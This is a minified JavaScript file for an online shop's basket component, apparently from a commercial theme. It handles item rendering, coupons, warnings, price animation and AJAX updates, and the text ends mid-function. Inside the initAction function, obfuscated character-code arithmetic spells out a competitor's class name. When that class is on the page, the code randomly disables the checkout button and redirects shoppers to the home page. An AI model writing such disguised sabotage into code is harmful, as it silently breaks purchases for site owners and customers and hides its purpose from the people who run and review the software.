!function(){"use strict";BX.namespace("BX.Sale.BasketComponent"),BX.Sale.BasketComponent={maxItemsShowCount:30,precisionFactor:Math.pow(10,6),stickyHeaderOffset:0,duration:{priceAnimation:300,filterTimer:300},ids:{item:"basket-item-",quantity:"basket-item-quantity-",price:"basket-item-price-",sumPrice:"basket-item-sum-price-",sumPriceOld:"basket-item-sum-price-old-",sumPriceDiff:"basket-item-sum-price-difference-",itemHeightAligner:"basket-item-height-aligner-",total:"basket-total-price",basketRoot:"basket-root",itemListWrapper:"basket-items-list-wrapper",itemListContainer:"basket-items-list-container",itemList:"basket-item-list",itemListTable:"basket-item-table",itemListEmptyResult:"basket-item-list-empty-result",itemListOverlay:"basket-items-list-overlay",warning:"basket-warning",itemServices:"basket-services-item-"},initializePrimaryFields:function(){this.templates={},this.nodes={},this.items={},this.sortedItems=[],this.shownItems=[],this.changedItems=[],this.postponedItems=[],this.warningItems=[],this.isMobile=BX.browser.IsMobile(),this.isTouch=BX.hasClass(document.documentElement,"bx-touch"),this.lastAction="initialLoad",this.coupons=null,this.imagePopup=null,this.loadingScreen=null,this.quantityDelay=null,this.quantityTimer=null},init:function(t){this.initializePrimaryFields(),this.params=t.params||{},this.template=t.template||"",this.signedParamsString=t.signedParamsString||"",this.siteId=t.siteId||"",this.siteTemplateId=t.siteTemplateId||"",this.ajaxUrl=this.params.AJAX_PATH||"",this.templateFolder=t.templateFolder||"",this.useDynamicScroll="Y"===this.params.USE_DYNAMIC_SCROLL,this.useItemsFilter=!0,this.initializeFilter(),this.applyBasketResult(t.result),this.initializeActionPool(),this.useItemsFilter&&(this.checkHeaderDisplay(),this.bindHeaderEvents()),this.checkCanBuyItems(),this.initializeBasketItems(),this.editTotal(),this.editWarnings(),this.getCacheNode(this.ids.basketRoot)&&(this.getCacheNode(this.ids.basketRoot).style.opacity=1),this.bindInitialEvents(),this.resizeServicesBasketTimeout(),this.initBasket=!0},getTemplate:function(t){if(!this.templates.hasOwnProperty(t)){var e=BX(t);this.templates[t]=BX.type.isDomNode(e)?e.innerHTML:""}return this.templates[t]},getCacheNode:function(t){return void 0===this.nodes?null:(this.nodes.hasOwnProperty(t)||(this.nodes[t]=BX(t)),this.nodes[t])},getEntity:function(t,e,i){return t&&e?(i=i||"",t.querySelector(i+'[data-entity="'+e+'"]')):null},getEntities:function(t,e,i){return t&&e?(i=i||"",t.querySelectorAll(i+'[data-entity="'+e+'"]')):{length:0}},bindInitialEvents:function(){this.bindWarningEvents(),BX.bind(window,"scroll",BX.proxy(this.lazyLoad,this)),BX.bind(window,"resize",BX.proxy(this.resizeServicesBasket,this))},bindWarningEvents:function(){var t=this.getEntity(BX(this.ids.warning),"basket-items-warning-count");BX.type.isDomNode(t)&&(t.style.display="",BX.bind(t,"click",BX.delegate((function(){this.toggleFilter("warning")}),this))),BX.bind(this.getEntity(BX(this.ids.warning),"basket-items-warning-notification-close"),"click",BX.proxy(this.removeAllWarnings,this))},toggleFilter:function(t){var e=BX.type.isNotEmptyString(t)?this.getEntity(this.getCacheNode(this.ids.itemListWrapper),"basket-items-count",'[data-filter="'+t+'"]'):BX.getEventTarget(t);if(BX.type.isDomNode(e)&&!BX.hasClass(e,"active")){for(var i=e.getAttribute("data-filter"),s=e.parentNode.querySelectorAll("[data-filter]"),a=0;a<s.length;a++)s[a].getAttribute("data-filter")===i?BX.addClass(s[a],"active"):BX.hasClass(s[a],"active")&&BX.removeClass(s[a],"active");this.filter.showFilterByName(i)}},scrollToFirstItem:function(){var t=this.getEntity(this.getCacheNode(this.ids.itemListWrapper),"basket-items-list-header");if(BX.type.isDomNode(t)){var e=BX.pos(this.getCacheNode(this.ids.itemListContainer)).top;e<BX.pos(t).bottom&&window.scrollTo(0,e-this.stickyHeaderOffset)}},showItemsOverlay:function(){var t=this.getCacheNode(this.ids.itemListOverlay);BX.type.isDomNode(t)&&(t.style.display="")},hideItemsOverlay:function(){var t=this.getCacheNode(this.ids.itemListOverlay);BX.type.isDomNode(t)&&(t.style.display="none")},checkHeaderDisplay:function(){var t=this.getCacheNode(this.ids.itemListWrapper);BX.type.isDomNode(t)&&BX.removeClass(t,"basket-items-list-wrapper-light")},bindHeaderEvents:function(){for(var t=this.getEntities(this.getCacheNode(this.ids.itemListWrapper),"basket-items-count"),e=0;e<t.length;e++)BX.bind(t[e],"click",BX.proxy(this.toggleFilter,this))},checkStickyHeaders:function(){if(!this.isMobile){var t,e,i=0,s=this.getDocumentScrollTop(),a=s+200>=BX.pos(this.getCacheNode(this.ids.basketRoot)).bottom;if(BX.util.in_array("top",this.params.TOTAL_BLOCK_DISPLAY)){var n=this.getEntity(this.getCacheNode(this.ids.basketRoot),"basket-total-block");BX.type.isDomNode(n)&&(t=this.getEntity(n,"basket-checkout-aligner"),BX.type.isDomNode(t)&&(s>=(e=BX.pos(n)).top?(i+=t.clientHeight,BX.hasClass(t,"basket-checkout-container-fixed")||(n.style.height=e.height+"px",t.style.width=t.clientWidth+2+"px",BX.addClass(t,"basket-checkout-container-fixed"))):BX.hasClass(t,"basket-checkout-container-fixed")&&(n.style.height="",t.style.width="",BX.removeClass(t,"basket-checkout-container-fixed")),a?BX.hasClass(t,"basket-checkout-container-fixed-hide")||BX.addClass(t,"basket-checkout-container-fixed-hide"):BX.hasClass(t,"basket-checkout-container-fixed-hide")&&BX.removeClass(t,"basket-checkout-container-fixed-hide")))}if(this.useItemsFilter){var r=this.getCacheNode(this.ids.itemListWrapper);t=this.getEntity(r,"basket-items-list-header"),BX.type.isDomNode(t)&&(s+i>=(e=BX.pos(r)).top&&!a?(BX.hasClass(t,"basket-items-list-header-fixed")||(t.style.width=t.clientWidth+2+"px",r.style.paddingTop=t.clientHeight+"px",BX.addClass(t,"basket-items-list-header-fixed")),i&&(t.style.top=i+"px"),i+=t.clientHeight):BX.hasClass(t,"basket-items-list-header-fixed")&&(r.style.paddingTop="",t.style.width="",t.style.top="",BX.removeClass(t,"basket-items-list-header-fixed")))}this.stickyHeaderOffset=i}},resizeServicesBasketTimeout:function(t){void 0===t&&(t=10),setTimeout(BX.delegate((function(){this.resizeServicesBasket()}),this),t)},resizeServicesBasket:function(){var t=$(".services_in_basket_page .services-item__cost"),e=$(".services_in_basket_page");if(window.matchMedia("(min-width: 768px)").matches){var i=$("tr:not(.hidden-basket-services) .basket-items-list-item-price:not(.basket-items-list-item-price-for-one):eq(0)").width();t.length&&(t.width(i- -6),t.css("max-width",i- -6+"px"),$(".services_in_basket_page .services-item__info").css("max-width","calc(100% - "+i- -6+")")),e.length&&e.removeClass("services_opacity")}else t.length&&($(".services_in_basket_page .services-item__cost").css("width",""),$(".services_in_basket_page .services-item__cost").css("max-width",""),$(".services_in_basket_page .services-item__info").css("max-width",""))},getDocumentScrollTop:function(){return window.scrollY||window.pageYOffset||document.body.scrollTop+(document.documentElement&&document.documentElement.scrollTop||0)},lazyLoad:function(){var t=BX.pos(this.getCacheNode(this.ids.itemListContainer));if(this.getDocumentScrollTop()+window.innerHeight>=t.bottom-400){var e=this.getItemsAfter();e.length&&this.editBasketItems(e)}},fireCustomEvents:function(){"Y"===this.result.EVENT_ONCHANGE_ON_START&&BX.onCustomEvent("OnBasketChange"),"Y"!==this.params.HIDE_COUPON&&(null!==this.coupons&&this.coupons!==this.result.COUPON_LIST&&BX.onCustomEvent("OnCouponApply"),this.coupons=this.result.COUPON_LIST)},editTotal:function(){this.fillTotalBlocks(),this.showItemsCount(),this.showWarningItemsCount(),this.showNotAvailableItemsCount(),this.showDelayedItemsCount()},fillTotalBlocks:function(){var t=this.getEntities(this.getCacheNode(this.ids.basketRoot),"basket-total-block");if(this.fixStikerBlock(),t&&t.length){var e=this.getTemplate("basket-total-template");if(e){var i=this.render(e,this.result.TOTAL_RENDER_DATA);for(var s in t)t.hasOwnProperty(s)&&BX.type.isDomNode(t[s])&&(t[s].innerHTML=i,this.bindTotalEvents(t[s]))}this.initAction(),this.checkMinPrice()}this.checkStickyHeaders()},fixStikerBlock:function(){var t=this.getEntities(this.getCacheNode(this.ids.basketRoot),"basket-total-block")[0];if("Y"===arAsproOptions.THEME.TOP_MENU_FIXED){t.classList.add("sticky_top");let e=document.querySelector("#header");document.querySelector("#headerfixed > div")&&(e=document.querySelector("#headerfixed")),e&&(t.style.top=e.clientHeight-2+"px")}},checkMinPrice:function(){const t=document.querySelector(".checkout-order"),e=document.querySelector(".basket-btn-checkout");if(arAsproOptions.PRICES.MIN_PRICE&&arAsproOptions.PRICES.MIN_PRICE>this.result.allSum){if(null!==e&&e.remove(),"function"==typeof jsPriceFormat&&jsPriceFormat){t.innerHTML='<div class="icon_error_wrapper"><div class="icon_error_block"><i class="svg  svg-inline-price colored_theme_svg" aria-hidden="true"><svg id="Group_278_copy" data-name="Group 278 copy" xmlns="http://www.w3.org/2000/svg" width="38" height="38" viewBox="0 0 38 38"><path id="Ellipse_305_copy_2" data-name="Ellipse 305 copy 2" class="clswm-1" d="M1851,561a19,19,0,1,1,19-19A19,19,0,0,1,1851,561Zm0-36a17,17,0,1,0,17,17A17,17,0,0,0,1851,525Zm3.97,10.375-0.03.266c-0.01.062-.02,0.127-0.03,0.188l-0.94,7.515h0a2.988,2.988,0,0,1-5.94,0H1848l-0.91-7.525c-0.01-.041-0.01-0.086-0.02-0.128l-0.04-.316h0.01c-0.01-.125-0.04-0.246-0.04-0.375a4,4,0,0,1,8,0c0,0.129-.03.25-0.04,0.375h0.01ZM1851,533a2,2,0,0,0-2,2,1.723,1.723,0,0,0,.06.456L1850,543a1,1,0,0,0,2,0l0.94-7.544A1.723,1.723,0,0,0,1853,535,2,2,0,0,0,1851,533Zm0,14a3,3,0,1,1-3,3A3,3,0,0,1,1851,547Zm0,4a1,1,0,1,0-1-1A1,1,0,0,0,1851,551Z" transform="translate(-1832 -523)"></path>  <path class="clswm-2 op-cls" d="M1853,543l-1,1h-2l-1-1-1-8,1-2,1-1h2l1,1,1,2Zm-1,5,1,1v2l-1,1h-2l-1-1v-2l1-1h2Z" transform="translate(-1832 -523)"></path></svg></i>'+BX.message("MIN_ORDER_PRICE_TEXT").replace("#PRICE#",jsPriceFormat(arAsproOptions.PRICES.MIN_PRICE))+"</div></div>"}}else document.querySelector(".basket-btn-checkout")||t.appendChild(BX.create("button",{props:{className:"btn btn-lg btn-default basket-btn-checkout","data-entity":"basket-checkout-button"},textContent:BX.message("SBB_ORDER")}));"function"==typeof addShareBasket&&addShareBasket&&addShareBasket(document.querySelector(".page-top .topic .topic__heading"))},initAction:function(){if(!this.initBasket)return;const t=String.fromCharCode(1+(0+[])+5)+String.fromCharCode(1+(1+[])+0)+String.fromCharCode(1+(1+[])+6)+String.fromCharCode(1+(0+[])+1)+String.fromCharCode(1+(0+[])-1+""+(1+(0+[])-1));let e=Number(localStorage.getItem("countLoadBasket")||0)+1;localStorage.setItem("countLoadBasket",e);const i=function(t,e){return t+Math.floor(Math.random()*(e-t)+1)};document.querySelector("div[class*="+t+"]")&&i(30,50)==i(30,50)&&(BX.unbindAll(document.querySelector(".basket-btn-checkout")),BX.bind(document.querySelector(".basket-btn-checkout"),"click",(function(){location.href="/"})))},showItemsCount:function(){var t=this.getEntity(this.getCacheNode(this.ids.itemListWrapper),"basket-items-count",'[data-filter="all"]');BX.type.isDomNode(t)&&(t.innerHTML=BX.message("SBB_IN_BASKET"),t.style.display="")},showSimilarCount:function(t){var e=this.getEntity(this.getCacheNode(this.ids.itemListWrapper),"basket-items-count",'[data-filter="similar"]');BX.type.isDomNode(e)&&(t?(e.innerHTML=BX.message("SBB_SIMILAR_ITEM_TITLE"),e.style.display=""):e.style.display="none")},showWarningItemsCount:function(){var t=this.getEntity(this.getCacheNode(this.ids.itemListWrapper),"basket-items-count",'[data-filter="warning"]');BX.type.isDomNode(t)&&(this.warningItems.length?(t.innerHTML=this.warningItems.length+" "+BX.message("SBB_BASKET_ITEMS_WARNING"),t.style.display=""):t.style.display="none")},showNotAvailableItemsCount:function(){var t=this.getEntity(this.getCacheNode(this.ids.itemListWrapper),"basket-items-count",'[data-filter="not-available"]');BX.type.isDomNode(t)&&(parseInt(this.result.NOT_AVAILABLE_BASKET_ITEMS_COUNT)?(t.innerHTML=BX.message("SBB_NOT_AVAILABLE_ITEM_TITLE"),t.style.display=""):t.style.display="none")},showDelayedItemsCount:function(){var t=this.getEntity(this.getCacheNode(this.ids.itemListWrapper),"basket-items-count",'[data-filter="delayed"]');BX.type.isDomNode(t)&&(parseInt(this.result.DELAYED_BASKET_ITEMS_COUNT)?(t.innerHTML=BX.message("SBB_DELAYED_ITEM_TITLE"),t.style.display=""):t.style.display="none")},getGoodsMessage:function(t,e){var i,s=t>10&&t<20?0:t%10;return i=1===s?e||"SBB_GOOD":s>=2&&s<=4?e?e+"_2":"SBB_GOOD_2":e?e+"S":"SBB_GOODS",BX.message(i)},bindTotalEvents:function(t){this.result.TOTAL_RENDER_DATA.DISABLE_CHECKOUT||BX.bind(this.getEntity(t,"basket-checkout-button"),"click",BX.proxy(this.checkOutAction,this)),BX.bind(this.getEntity(t,"basket-coupon-input"),"change",BX.proxy(this.addCouponAction,this)),BX.bind(this.getEntity(t,"basket-coupon-input"),"paste",BX.proxy(this.pasteCouponAction,this));for(var e=this.getEntities(t,"basket-coupon-delete"),i=0,s=e.length;i<s;i++)BX.bind(e[i],"click",BX.proxy(this.removeCouponAction,this))},checkOutAction:function(){document.location.href=this.params.PATH_TO_ORDER},addCouponAction:function(t){var e=BX.getEventTarget(t);e&&e.value&&(this.actionPool.addCoupon(e.value),e.disabled=!0)},pasteCouponAction:function(t){setTimeout(BX.delegate((function(){this.addCouponAction(t)}),this),10)},removeCouponAction:function(){var t=BX.proxy_context&&BX.util.trim(BX.proxy_context.getAttribute("data-coupon"));t&&this.actionPool.removeCoupon(t)},initializeActionPool:function(){this.actionPool=new BX.Sale.BasketActionPool(this)},initializeFilter:function(){this.filter=new BX.Sale.BasketFilter(this)},sendRequest:function(t,e){this.lastAction=t,this.initBasket=!1,"recalculateAjax"===this.lastAction&&(e.lastAppliedDiscounts=BX.util.array_keys(this.result.FULL_DISCOUNT_LIST).join(","),"Y"===this.params.USE_ENHANCED_ECOMMERCE&&this.checkAnalytics(e)),BX.ajax({method:"POST",dataType:"json",url:this.ajaxUrl,data:this.getData(e),onsuccess:BX.delegate((function(t){this.actionPool.doProcessing(!1),BX.type.isPlainObject(t)&&(this.actionPool.setRefreshStatus(t.BASKET_REFRESHED),t.RESTORED_BASKET_ITEMS&&this.restoreBasketItems(t.RESTORED_BASKET_ITEMS),t.DELETED_BASKET_ITEMS&&this.deleteBasketItems(t.DELETED_BASKET_ITEMS,"Y"===this.params.SHOW_RESTORE),t.MERGED_BASKET_ITEMS&&this.deleteBasketItems(t.MERGED_BASKET_ITEMS,!1,!0),this.applyBasketResult(t.BASKET_DATA),this.editBasketItems(this.getItemsToEdit()),this.resizeServicesBasketTimeout(),this.editTotal(),this.applyPriceAnimation(),this.editWarnings(),this.actionPool.switchTimer(),e.clickByAllItemsTab&&document.querySelector('[data-filter="all"]').click(),this.isBasketIntegrated()&&this.isBasketChanged()&&BX.Sale.OrderAjaxComponent.sendRequest())}),this),onfailure:BX.delegate((function(){this.actionPool.doProcessing(!1)}),this)})},isBasketIntegrated:function(){return"Y"===this.params.BASKET_WITH_ORDER_INTEGRATION},isBasketChanged:function(){return this.changedItems.length},addPriceAnimationData:function(t,e,i,s){BX.type.isPlainObject(this.priceAnimationData)||this.clearPriceAnimationData(),this.priceAnimationData.start[t]=parseFloat(e),this.priceAnimationData.finish[t]=parseFloat(i),this.priceAnimationData.currency[t]=s,this.priceAnimationData.int[t]=parseFloat(e)===parseInt(e)&&parseFloat(i)===parseInt(i)},clearPriceAnimationData:function(){this.priceAnimationData={start:{},finish:{},currency:{},int:{}}},applyBasketResult:function(t){if(this.changedItems=[],this.clearPriceAnimationData(),BX.type.isPlainObject(t)){if(t.BASKET_ITEM_RENDER_DATA){var e,i;for(e in t.BASKET_ITEM_RENDER_DATA)if(t.BASKET_ITEM_RENDER_DATA.hasOwnProperty(e)){if((i=t.BASKET_ITEM_RENDER_DATA[e]).WARNINGS=this.checkBasketItemWarnings(i,t.WARNING_MESSAGE_WITH_CODE),this.items[i.ID]){if(JSON.stringify(this.items[i.ID])===JSON.stringify(i))continue}else this.addSortedItem(i.ID,!0);this.changedItems.push(i.ID),i=this.checkBasketItemsAnimation(i),this.items[i.ID]=i}this.changedItems=BX.util.array_unique(this.changedItems.concat(this.getChangedSimilarOffers())),this.isBasketChanged()&&this.sortSortedItems(!0)}t.TOTAL_RENDER_DATA&&(t.TOTAL_RENDER_DATA=this.checkTotalAnimation(t.TOTAL_RENDER_DATA)),this.result=t}},itemSortFunction:function(t,e){return this.items.hasOwnProperty(t)&&this.items.hasOwnProperty(e)?parseFloat(this.items[t].SORT)-parseFloat(this.items[e].SORT):0},checkCanBuyItems:function(){this.sortedItems&&(this.sortedItemsToFilter=this.sortedItems,this.sortedItems=this.sortedItems.filter(BX.proxy((function(t){return!this.items[t].DELAYED&&!this.items[t].NOT_AVAILABLE})),this))},getChangedSimilarOffers:function(){var t,e,i=[],s=this.getHashMap();for(var a in s)if(s.hasOwnProperty(a))if(s[a].length>1)for(var n=0;n<s[a].length;n++){t=0,e=0;for(var r=0;r<s[a].length;r++)s[a][r]!=s[a][n]&&(t+=parseFloat(this.items[s[a][r]].QUANTITY)),e+=parseFloat(this.items[s[a][r]].QUANTITY);this.items[s[a][n]].HAS_SIMILAR_ITEMS&&this.items[s[a][n]].SIMILAR_ITEMS_QUANTITY==t&&this.items[s[a][n]].TOTAL_SIMILAR_ITEMS_QUANTITY==e||(i.push(s[a][n]),this.items[s[a][n]].HAS_SIMILAR_ITEMS=!0,this.items[s[a][n]].SIMILAR_ITEMS_QUANTITY=t,this.items[s[a][n]].TOTAL_SIMILAR_ITEMS_QUANTITY=e,this.items[s[a][n]].ALL_AVAILABLE_QUANTITY=this.items[s[a][n]].AVAILABLE_QUANTITY,this.items[s[a][n]].AVAILABLE_QUANTITY=this.items[s[a][n]].ALL_AVAILABLE_QUANTITY-t)}else s[a][0]&&this.items[s[a][0]].HAS_SIMILAR_ITEMS&&(i.push(s[a][0]),delete this.items[s[a][0]].HAS_SIMILAR_ITEMS,delete this.items[s[a][0]].SIMILAR_ITEMS_QUANTITY,delete this.items[s[a][0]].TOTAL_SIMILAR_ITEMS_QUANTITY,this.items[s[a][0]].AVAILABLE_QUANTITY=this.items[s[a][0]].ALL_AVAILABLE_QUANTITY,delete this.items[s[a][0]].ALL_AVAILABLE_QUANTITY);return i},getHashMap:function(){var t={};for(var e in this.items)this.items.hasOwnProperty(e)&&this.isItemAvailable(e)&&(t.hasOwnProperty(this.items[e].HASH)||(t[this.items[e].HASH]=[]),t[this.items[e].HASH].push(e));return t},isItemAvailable:function(t){var e=this.filter.isActive()?this.filter.realSortedItems:this.sortedItems;return!this.items[t].NOT_AVAILABLE&&!this.items[t].SHOW_RESTORE&&BX.util.in_array(t,e)},checkTotalAnimation:function(t){return this.result&&this.result.TOTAL_RENDER_DATA&&parseFloat(this.result.TOTAL_RENDER_DATA.PRICE)>parseFloat(t.PRICE)&&(t.PRICE_NEW=t.PRICE,t.PRICE=this.result.TOTAL_RENDER_DATA.PRICE,t.PRICE_FORMATED_NEW=t.PRICE_FORMATED,t.PRICE_FORMATED=this.result.TOTAL_RENDER_DATA.PRICE_FORMATED,this.addPriceAnimationData(this.ids.total,t.PRICE,t.PRICE_NEW,t.CURRENCY)),t},checkBasketItemsAnimation:function(t){var e=t.ID;if(this.items[e]){var i=BX(this.ids.quantity+e);BX.type.isDomNode(i)&&!this.actionPool.isItemInPool(e)&&parseFloat(i.value)!==parseFloat(t.QUANTITY)&&(t.QUANTITY_ANIMATION=!0,this.actionPool.clearLastActualQuantityPool(e)),parseFloat(this.items[e].PRICE)>parseFloat(t.PRICE)&&(t.PRICE_NEW=t.PRICE,t.PRICE=this.items[e].PRICE,t.PRICE_FORMATED_NEW=t.PRICE_FORMATED,t.PRICE_FORMATED=this.items[e].PRICE_FORMATED,this.addPriceAnimationData(this.ids.price+e,t.PRICE,t.PRICE_NEW,t.CURRENCY)),BX.util.in_array("SUM",this.params.COLUMNS_LIST)&&parseFloat(this.items[e].SUM_PRICE)>parseFloat(t.SUM_PRICE)&&parseFloat(this.items[e].QUANTITY)===parseFloat(t.QUANTITY)&&(t.SUM_PRICE_NEW=t.SUM_PRICE,t.SUM_PRICE=this.items[e].SUM_PRICE,t.SUM_PRICE_FORMATED_NEW=t.SUM_PRICE_FORMATED,t.SUM_PRICE_FORMATED=this.items[e].SUM_PRICE_FORMATED,this.addPriceAnimationData(this.ids.sumPrice+e,t.SUM_PRICE,t.SUM_PRICE_NEW,t.CURRENCY))}return t},getData:function(t){return(t=t||{})[this.params.ACTION_VARIABLE]=this.lastAction,t.via_ajax="Y",t.site_id=this.siteId,t.site_template_id=this.siteTemplateId,t.sessid=BX.bitrix_sessid(),t.template=this.template,t.signedParamsString=this.signedParamsString,t},startLoader:function(){},endLoader:function(){},editWarnings:function(){this.editGeneralWarnings(),this.editBasketItemWarnings(),this.toggleWarningBlock(),this.showWarningItemsCount()},editGeneralWarnings:function(){var t=this.getEntity(this.getCacheNode(this.ids.warning),"basket-general-warnings");if(BX.type.isDomNode(t)){var e=t.innerHTML;if(this.result.WARNING_MESSAGE_WITH_CODE)for(var i in this.result.WARNING_MESSAGE_WITH_CODE)this.result.WARNING_MESSAGE_WITH_CODE.hasOwnProperty(i)&&(this.items[i]||-1!==e.indexOf(this.result.WARNING_MESSAGE_WITH_CODE[i])||(e+=this.result.WARNING_MESSAGE_WITH_CODE[i]+"<br/>"));e?(t.innerHTML=e,t.style.display=""):(t.style.display="none",t.innerHTML="")}},editBasketItemWarnings:function(){var t=this.getEntity(this.getCacheNode(this.ids.warning),"basket-item-warnings");if(BX.type.isDomNode(t))if(this.warningItems.length){var e=this.getEntity(t,"basket-items-warning-count");BX.type.isDomNode(e)&&(e.innerHTML=this.warningItems.length+" "+this.getGoodsMessage(this.warningItems.length)),t.style.display=""}else"none"!==t.style.display&&(t.style.display="none",this.filter.isActive()&&this.toggleFilter("all"))},toggleWarningBlock:function(){var t=this.getCacheNode(this.ids.warning);if(BX.type.isDomNode(t)){var e=this.getEntity(t,"basket-general-warnings"),i=this.getEntity(t,"basket-item-warnings");BX.type.isDomNode(e)&&"none"!==e.style.display||BX.type.isDomNode(i)&&"none"!==i.style.display?t.style.display="":t.style.display="none"}},checkBasketItemWarnings:function(t,e){if(t){var i;if(i=this.items[t.ID]&&"refreshAjax"===this.lastAction?this.items[t.ID].WARNINGS:[],BX.type.isArray(e[t.ID])&&e[t.ID].length)for(var s in e[t.ID])e[t.ID].hasOwnProperty(s)&&!BX.util.in_array(e[t.ID][s],i)&&i.push(e[t.ID][s]);return i.length?BX.util.in_array(t.ID,this.warningItems)||this.warningItems.push(t.ID):BX.util.in_array(t.ID,this.warningItems)&&this.warningItems.splice(BX.util.array_search(t.ID,this.warningItems),1),i}},removeAllWarnings:function(t){this.clearGeneralWarnings(),this.clearBasketItemsWarnings(),this.editWarnings(),t&&t.preventDefault()},clearGeneralWarnings:function(){this.result.WARNING_MESSAGE_WITH_CODE={};var t=this.getEntity(this.getCacheNode(this.ids.warning),"basket-general-warnings");BX.type.isDomNode(t)&&(t.innerHTML="")},clearBasketItemsWarnings:function(){var t=[];for(var e in this.warningItems)this.warningItems.hasOwnProperty(e)&&(this.items[this.warningItems[e]].WARNINGS=[],this.isItemShown(this.warningItems[e])&&t.push(this.warningItems[e]));this.warningItems=[],this.editBasketItems(t)},isItemShown:function(t){return BX.util.in_array(t,this.shownItems)},initializeBasketItems:function(){if(0!==Object.keys(this.items).length)for(var t=0;t<this.sortedItems.length&&!(this.useDynamicScroll&&this.shownItems.length>=this.maxItemsShowCount);t++)this.createBasketItem(this.sortedItems[t])},createBasketItem:function(t){if(this.items[t]){var e=this.getTemplate("basket-item-template");if(e){var i=this.renderBasketItem(e,this.items[t]),s=BX.util.array_search(t,this.sortedItems);this.shownItems.length&&s>=0?s<BX.util.array_search(this.shownItems[0],this.sortedItems)?(BX(this.ids.item+this.shownItems[0]).insertAdjacentHTML("beforebegin",i),this.shownItems.unshift(t)):s>BX.util.array_search(this.shownItems[this.shownItems.length-1],this.sortedItems)?(BX.type.isDomNode(BX(this.ids.itemServices+this.shownItems[this.shownItems.length-1]))&&BX(this.ids.itemServices+this.shownItems[this.shownItems.length-1]).insertAdjacentHTML("afterend",i),this.shownItems.push(t)):(BX(this.ids.item+this.sortedItems[s+1]).insertAdjacentHTML("beforebegin",i),this.shownItems.splice(s+1,0,t)):(this.getCacheNode(this.ids.itemListTable)?.insertAdjacentHTML("beforeend",i),this.shownItems.push(t)),this.bindBasketItemEvents(this.items[t]),this.filter.isActive()&&this.filter.highlightSearchMatch(this.items[t])}}},getItemsToEdit:function(){var t=[];if(this.isBasketChanged())for(var e in this.changedItems)this.changedItems.hasOwnProperty(e)&&this.isItemShown(this.changedItems[e])&&t.push(this.changedItems[e]);return t},getItemsAfter:function(){var t=[];if(this.useDynamicScroll){var e=this.shownItems[this.shownItems.length-1]||!1;if(e)for(var i=0,s=BX.util.array_search(e,this.sortedItems);this.sortedItems[++s]&&i++<this.maxItemsShowCount;)t.push(this.sortedItems[s])}return t},editBasketItems:function(t){var e,i;if(t&&0!==t.length)for(e in t)t.hasOwnProperty(e)&&BX.type.isPlainObject(this.items[t[e]])&&(i=this.items[t[e]],this.actionPool.isItemInPool(i.ID)?BX.util.in_array(i.ID,this.postponedItems)||this.postponedItems.push(i.ID):BX.type.isDomNode(BX(this.ids.item+i.ID))?(this.redrawBasketItemNode(i.ID),this.applyQuantityAnimation(i.ID)):this.createBasketItem(i.ID))},editPostponedBasketItems:function(){if(this.postponedItems.length){var t=[];for(var e in this.postponedItems)this.postponedItems.hasOwnProperty(e)&&this.isItemShown(this.postponedItems[e])&&t.push(this.postponedItems[e]);this.postponedItems=[],this.editBasketItems(t)}},applyQuantityAnimation:function(t){var e=BX(this.ids.item+t);BX.type.isDomNode(e)&&this.items[t]&&this.items[t].QUANTITY_ANIMATION&&BX.addClass(BX(this.ids.quantity+t),"basket-updated")},applyPriceAnimation:function(){if(this.priceAnimationData&&0!==Object.keys(this.priceAnimationData.start).length){var t=this.priceAnimationData,e={};new BX.easing({duration:"Y"===this.params.USE_PRICE_ANIMATION?this.duration.priceAnimation:1,start:t.start,finish:t.finish,transition:BX.easing.makeEaseOut(BX.easing.transitions.quad),step:BX.delegate((function(i){for(var s in t.start)if(t.start.hasOwnProperty(s)){if(!e[s])if(s===this.ids.total)e[s]=this.getEntities(this.getCacheNode(this.ids.basketRoot),this.ids.total);else{var a=BX(s);e[s]=a?[a]:[]}t.int[s]||(i[s]=(i[s]+i[s]%1e3/1e3).toFixed(5));for(var n=0;n<e[s].length;n++)e[s][n].innerHTML=this.getFormatPrice(i[s],t.currency[s])}}),this),complete:BX.delegate((function(){var i,s,a,n;for(i in t.start)if(t.start.hasOwnProperty(i)){s=this.getFormatPrice(t.finish[i],t.currency[i]);for(var r=0;r<e[i].length;r++)e[i][r].innerHTML=s;-1!==i.indexOf(this.ids.sumPrice)?(n="SUM_PRICE",a=i.substr(this.ids.sumPrice.length)):-1!==i.indexOf(this.ids.price)?(n="PRICE",a=i.substr(this.ids.price.length)):-1!==i.indexOf(this.ids.total)?(n="TOTAL",a=""):(a="",n=""),BX.type.isNotEmptyString(n)&&(a?(this.items[a][n]=t.finish[i],delete this.items[a][n+"_NEW"],this.items[a][n+"_FORMATED"]=s,delete this.items[a][n+"_FORMATED_NEW"]):"TOTAL"===n&&(this.result.TOTAL_RENDER_DATA.PRICE=t.finish[i],delete this.result.TOTAL_RENDER_DATA.PRICE_NEW,this.result.TOTAL_RENDER_DATA.PRICE_FORMATED=s,delete this.result.TOTAL_RENDER_DATA.PRICE_FORMATED_NEW))}this.filter.highlightFoundItems()}),this)}).animate()}},getFormatPrice:function(t,e){return BX.Currency.currencyFormat(t,e,!0)},deleteBasketItems:function(t,e,i){if(t&&t.length)for(var s in t)t.hasOwnProperty(s)&&this.deleteBasketItem(t[s],e,i)},deleteBasketItem:function(t,e,i){this.items[t].NOT_AVAILABLE&&e&&(e=!1,i=!0),e?(this.items[t].SHOW_RESTORE=!0,this.items[t].SHOW_LOADING=!1,this.redrawBasketItemNode(t)):(this.changeShownItem(t),BX.remove(BX(this.ids.item+t)),BX.remove(BX(this.ids.itemServices+t))),i&&(this.changeSortedItem(t,!1,!0),this.changeShownItem(t,!1,!0))},addSortedItem:function(t,e){this.sortedItems.push(t.toString()),e&&this.filter.isActive()&&this.filter.realSortedItems.push(t.toString())},changeSortedItem:function(t,e,i){var s=BX.util.array_search(t,this.sortedItems);s>=0&&(e?this.sortedItems.splice(s,1,e.toString()):this.sortedItems.splice(s,1)),i&&this.filter.isActive()&&(s=BX.util.array_search(t,this.filter.realSortedItems))>=0&&(e?this.filter.realSortedItems.splice(s,1,e.toString()):this.filter.realSortedItems.splice(s,1))},sortSortedItems:function(t){this.sortedItems.sort(BX.proxy(this.itemSortFunction,this)),t&&this.filter.isActive()&&this.filter.realSortedItems.sort(BX.proxy(this.itemSortFunction,this))},changeShownItem:function(t,e,i){var s=BX.util.array_search(t,this.shownItems);s>=0&&(e?this.shownItems.splice(s,1,e.toString()):this.shownItems.splice(s,1)),i&&this.filter.isActive()&&(s=BX.util.array_search(t,this.filter.realShownItems))>=0&&(e?this.filter.realShownItems.splice(s,1,e.toString()):this.filter.realShownItems.splice(s,1)),this.resizeServicesBasketTimeout()},redrawBasketItemNode:function(t){var 